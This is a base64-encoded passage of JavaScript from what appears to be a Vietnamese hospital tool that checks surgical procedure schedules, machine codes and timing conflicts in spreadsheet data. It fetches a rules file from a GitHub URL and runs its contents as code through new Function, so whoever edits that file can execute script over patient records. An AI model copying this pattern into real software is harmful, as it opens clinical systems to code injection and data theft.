ICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHJvd1twcm9jZWR1cmVJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyBjw7MgdGjhu6cgdGh14bqtdCBuw6BvIGjhu6NwIGzhu4cgxJHhu4Mga2nhu4NtIHRyYS4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkgZOG7ryBsaeG7h3UuJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpOw0KICAgICAgICAgICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKHByb2NlZHVyZXMpOw0KCQkJCSAvLyA9PT0gVEjDik0gMyBEw5JORyBDaGVjayBtw6MgbcOheSA9PT0NCiAgICAgICAgY2hlY2tNYWNoaW5lRXJyb3JzKHByb2NlZHVyZXMsIGRhdGEpOw0KICAgICAgICBjaGVja01hY2hpbmVDb25mbGljdHMocHJvY2VkdXJlcywgZGF0YSk7DQoJCWNoZWNrTWlzc2luZ01hY2hpbmVDb2Rlcyhwcm9jZWR1cmVzLCBkYXRhKTsgDQoJCWNoZWNrRGF0ZU1pc21hdGNoKHByb2NlZHVyZXMsIGRhdGEpOw0KICAgICAgICAvLyA9PT0gS+G6vlQgVEjDmkMgVEjDik0gPT09DQogICAgICAgICAgICAgICAgZGlzcGxheVJlc3VsdHMocHJvY2VkdXJlcywgc2tpcHBlZFJvd3MpOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA9IGhlcmJQcm9jZWR1cmVzOw0KCQkJCS8vIC0tLSBD4bqtcCBuaOG6rXQgc+G7kSBjYSBraMOhYyDEkWEgc+G7kSB0csOqbiBuw7p0IC0tLQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogIGlmICh0eXBlb2YgdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQgPT09ICdmdW5jdGlvbicpIHsNCiAgICB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpOw0KICB9DQp9LCAxMDApOw0KDQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KCQkJCSANCiAgICAgICAgLy8gPT09IFRIw4pNIDMgRMOSTkcgY2hlY2sgbcOjIG3DoXkgPT09DQogICAgICAgIGRpc3BsYXlNYWNoaW5lRXJyb3JzKCk7DQogICAgICAgIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCk7DQoJCWRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpOw0KCQlkaXNwbGF5RGF0ZU1pc21hdGNoRXJyb3JzKCk7DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBUSMOKTSA9PT0NCiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgbG9nRXJyb3IoZXJyb3IubWVzc2FnZSwgbnVsbCwgZXJyb3Iuc3RhY2spOw0KICAgICAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgICAgICAgICBhbGVydCgnQ8OzIGzhu5dpIHjhuqN5IHJhIGtoaSB44butIGzDvSBk4buvIGxp4buHdTogJyArIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCg0KbGV0IGNvbmZsaWN0UnVsZXNUZXh0ID0gJyc7DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRDb25mbGljdFJ1bGVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV94bHRodXRodWF0LnR4dD90cz0nICsgRGF0ZS5ub3coKTsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgaWYgKCFyZXMub2spIHRocm93IG5ldyBFcnJvcignS2jDtG5nIHThuqNpIMSRxrDhu6NjIGNoYXVfeGx0aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAoYXdhaXQgcmVzLnRleHQoKSkudHJpbSgpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kgdOG6o2kgY2hhdV94bHRodXRodWF0LnR4dDonLCBlKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsgLy8gZmFsbGJhY2s6IHLhu5duZyAtPiBjb2kgbmjGsCBraMO0bmcgY8OzIG5nb+G6oWkgbOG7hw0KICAgIH0NCn0NCg0KDQoNCg0KICAgICAgICBmdW5jdGlvbiBjaGVja0NvbmZsaWN0cyhwcm9jZWR1cmVzKSB7DQogICAgICAgICAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwcyA9IHt9Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5vcGVyYXRvcn1fJHtwcm9jLmRhdGV9YDsNCiAgICAgICAgICAgICAgICBpZiAoIWdyb3Vwc1trZXldKSB7DQogICAgICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldID0gW107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhncm91cHMpLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICAgICAgICAgIGdyb3VwLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8IGdyb3VwLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByZXYgPSBncm91cFtpIC0gMV07DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1cnJlbnQgPSBncm91cFtpXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldkVuZFdpdGhCdWZmZXIgPSBwcmV2LmVuZCArIChwcmV2LnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaXNBZGphY2VudCA9IGlnbm9yZUFkamFjZW50ICYmIGN1cnJlbnQuc3RhcnQgPT09IHByZXYuZW5kOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKGN1cnJlbnQuc3RhcnQgPCBwcmV2RW5kV2l0aEJ1ZmZlciAmJiAhaXNBZGphY2VudCkgew0KICAgICAgICAgICAgICAgICANCg0KbGV0IGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIHRyeSB7DQogICAgICAgIGlmIChjb25mbGljdFJ1bGVzVGV4dCAmJiBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0Q29uZGl0aW9uID0gbmV3IEZ1bmN0aW9uKCdwcmV2JywnY3VycmVudCcsJ3JldHVybiAnICsgY29uZmxpY3RSdWxlc1RleHQudHJpbSgpKTsNCiAgICAgICAgICAgIC8vIGNvbmZsaWN0Q29uZGl0aW9uKCkgVFLhuqIgVuG7gCB0cnVlIG7hur91ICrEkcaw4bujYyBtaeG7hW4geHVuZyDEkeG7mXQqDQogICAgICAgICAgICBjb25zdCBhbGxvd2VkID0gY29uZmxpY3RDb25kaXRpb24ocHJldiwgY3VycmVudCk7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gIWFsbG93ZWQ7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsgLy8ga2jDtG5nIGPDsyBydWxlIC0+IGPhu6kgYsOhbyB4dW5nIMSR4buZdA0KICAgICAgICB9DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkcOhbmggZ2nDoSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbjonLCBlcnIpOw0KICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsNCiAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc0NvbmZsaWN0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdFJlYXNvbiA9IGAke3ByZXYucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke3ByZXYucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtwcmV2LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtwcmV2LmRpc3BsYXlTdGFydH0tJHtwcmV2LmRpc3BsYXlFbmR9YDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZXYuY29uZmxpY3QgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcHJldi5jb25mbGljdFJlYXNvbi5pbmNsdWRlcyhjdXJyZW50LnByb2NlZHVyZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdFJlYXNvbiArPSAocHJldi5jb25mbGljdFJlYXNvbiA/ICc8YnI+PGJyPicgOiAnJykgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAgJHtjdXJyZW50LnByb2NlZHVyZX08YnI+4oCiIELhu4duaCBuaMOibjogJHtjdXJyZW50LnBhdGllbnROYW1lfTxicj7igKIgTmfDoHk6ICR7Y3VycmVudC5kYXRlfTxicj7igKIgVGjhu51pIGdpYW46ICR7Y3VycmVudC5kaXNwbGF5U3RhcnR9LSR7Y3VycmVudC5kaXNwbGF5RW5kfWA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KDQovLyBIw6BtIGtp4buDbSB0cmEgZ+G6r24gc2FpIG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUVycm9ycyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVFcnJvckxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgIC8vIFTDrG0gY+G7mXQgYsOhYyBz4bu5IGNo4buJIMSR4buLbmgNCiAgICBjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCiAgIA0KICAgIGlmIChtYWNoaW5lQ29kZUluZGV4ID09PSAtMSkgew0KICAgICAgICBjb25zb2xlLmxvZygiS2jDtG5nIHTDrG0gdGjhuqV5IGPhu5l0IG3DoyBtw6F5IHRyb25nIGZpbGUgRXhjZWwiKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIFTDrG0gY8OhYyBj4buZdCBraMOhYyBj4bqnbiB0aGnhur90DQogICAgY29uc3QgcHJvY2VkdXJlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKTsNCiAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KCWNvbnN0IHBhdGllbnRJZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk3DoyBCTiIpKTsNCgljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgY29uc3Qgc3RhcnRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UgdGjhu7FjIGhp4buHbiIpKTsNCiAgICBjb25zdCBlbmRJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YyIpKTsNCg0KICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICANCiAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgaWYgKCFwcm9jZWR1cmVOYW1lIHx8ICFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IG1hY2hpbmVDb2RlID0gKHJvd1ttYWNoaW5lQ29kZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVJbmZvID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gQ2jhu4kga2nhu4NtIHRyYSAzIHRo4bunIHRodeG6rXQgY8OzIG1hY2hpbmVDb2RlDQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWRDb2RlcyA9IEFycmF5LmlzQXJyYXkocHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgDQogICAgICAgICAgICAgICAgPyBwcm9jZWR1cmVJbmZvLm1hY2hpbmVDb2RlIA0KICAgICAgICAgICAgICAgIDogW3Byb2NlZHVyZUluZm8ubWFjaGluZUNvZGVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBtw6MgbcOheSBjw7MgY2jhu6lhIGLhuqV0IGvhu7MgbcOjIGV4cGVjdGVkIG7DoG8ga2jDtG5nDQogICAgICAgICAgICBjb25zdCBpc1ZhbGlkTWFjaGluZSA9IGV4cGVjdGVkQ29kZXMuc29tZShjb2RlID0+IA0KICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoY29kZS50b1VwcGVyQ2FzZSgpKQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFpc1ZhbGlkTWFjaGluZSAmJiBtYWNoaW5lQ29kZSAhPT0gJycpIHsNCiAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBYw6FjIMSR4buLbmggdGjDtG5nIGLDoW8gbOG7l2kgY+G7pSB0aOG7gyBk4buxYSB0csOqbiBtw6MgbcOheSBuaOG6rXAgc2FpDQogICAgICAgICAgICAgICAgbGV0IGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gbcOheSBjaMawYSB4w6FjIMSR4buLbmgnOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdNxJBDJykpIHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSBtw6F5IMSRaeG7h24gY2jDom0gcuG7k2knOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcygnxJBITicpKSB7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gxJHDqG4gaOG7k25nIG5nb+G6oWkgcuG7k2knOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAobWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcygnR0gnKSB8fCBtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdPR0gnKSkgew0KICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSAnR+G6r24gbmjhuqdtIG3DoXkgZ2nDoWMgaMahaSBy4buTaSc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIG1hY2hpbmVFcnJvckxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLCAgICAgDQoJCQkJCXByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJZG9jdG9yOiBkb2N0b3JJbmRleCAhPT0gLTEgPyByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywgLy8gVGjDqm0gYsOhYyBz4bu5DQogICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0Py5kYXRlS2V5IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgICAgICAgICAgICAgc3RhcnRUaW1lOiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgZW5kVGltZTogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBtYWNoaW5lQ29kZTogbWFjaGluZUNvZGUsDQogICAgICAgICAgICAgICAgICAgIGV4cGVjdGVkQ29kZXM6IGV4cGVjdGVkQ29kZXMuam9pbignIGhv4bq3YyAnKSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogZXJyb3JNZXNzYWdlIC8vIFPhu60gZOG7pW5nIHRow7RuZyBiw6FvIGPhu6UgdGjhu4MNCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEzhu5dpIGtp4buDbSB0cmEgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCBtw6F5DQpmdW5jdGlvbiBjaGVja01hY2hpbmVDb25mbGljdHMocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cgPSBbXTsNCiAgICANCiAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KICAgIGNvbnN0IGhlYWRlckxpbmUyID0ganNvbkRhdGFbOF0gfHwgW107DQogICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCiAgICApOw0KDQogICAgLy8gVMOsbSBj4buZdCBtw6MgbcOheQ0KICAgIGNvbnN0IG1hY2hpbmVDb2RlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gDQogICAgICAgIGguaW5jbHVkZXMoIk3DoyBtw6F5IikgfHwgaC5pbmNsdWRlcygiTcOjIG3DoXkgdGhlbyB0aOG7pyB0aHXhuq10IikNCiAgICApOw0KICAgICAvLyBUw6xtIGPhu5l0IGLDoWMgc+G7uSBjaOG7iSDEkeG7i25oDQogICAgY29uc3QgZG9jdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiQsOhYyBz4bu5IGNo4buJIMSR4buLbmgiKSk7DQogICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkiKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICBjb25zdCBtYWNoaW5lUHJvY2VkdXJlcyA9IFtdOw0KICAgIA0KICAgIC8vIEzhu41jIGPDoWMgdGjhu6cgdGh14bqtdCBjw7Mgc+G7rSBk4bulbmcgbcOheQ0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1tjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlSW5mbyA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGlmICghbWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgDQogICAgICAgICAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KCQkgICAgY29uc3QgcGF0aWVudElkSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTcOjIEJOIikpOw0KCQkJY29uc3QgcGF0aWVudGFnZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlR14buVaSIpKTsNCiAgICAgICAgICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgICAgICAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgICAgICAgICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChzdGFydCAmJiBlbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiBvcGVyYXRvckluZGV4ICE9PSAtMSA/IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIG